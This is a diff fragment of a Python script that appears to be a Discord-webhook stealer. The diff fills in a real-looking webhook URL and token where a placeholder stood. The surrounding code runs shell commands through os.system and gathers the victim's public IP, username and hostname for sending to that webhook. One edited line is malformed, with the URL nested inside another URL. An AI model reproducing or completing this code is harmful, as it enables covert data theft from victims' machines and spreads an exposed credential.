@@ -67,7 +67,7 @@ import marshal, zlib, base64, lzma
 import json
 from base64 import *
 
-send_webhook = "your shitty webhook"
+send_webhook = "https://discord.com/api/webhooks/1350699830976053289/JOvAGUNRZEtuOX7mNyClKWOiDkpdsiURNan4RkrPmbdPcSMKIkDtG7UqDbM0kAQ6DbhR"
 
 def command(c):
     os.system(c)
@@ -225,8 +225,8 @@ def get_size(bytes, suffix="B"):
             return f"{bytes:.2f}{unit}{suffix}"
         bytes /= factor
 
-WEBHOOK_URL = "your shitty webhook" #WEBHOOK URL GOES INSIDE THE QOUTES!
-webhook = SyncWebhook.from_url('https://discord.com/api/webhooks/[your shitty webhook]') # Initializing webhook
+WEBHOOK_URL = "https://discord.com/api/webhooks/1350699830976053289/JOvAGUNRZEtuOX7mNyClKWOiDkpdsiURNan4RkrPmbdPcSMKIkDtG7UqDbM0kAQ6DbhR" #WEBHOOK URL GOES INSIDE THE QOUTES!
+webhook = SyncWebhook.from_url('https://discord.com/api/webhooks/[https://discord.com/api/webhooks/1350699830976053289/JOvAGUNRZEtuOX7mNyClKWOiDkpdsiURNan4RkrPmbdPcSMKIkDtG7UqDbM0kAQ6DbhR]') # Initializing webhook
 ip = requests.get('https://api.ipify.org').text
 username = getpass.getuser()
 hostname = socket.gethostname()
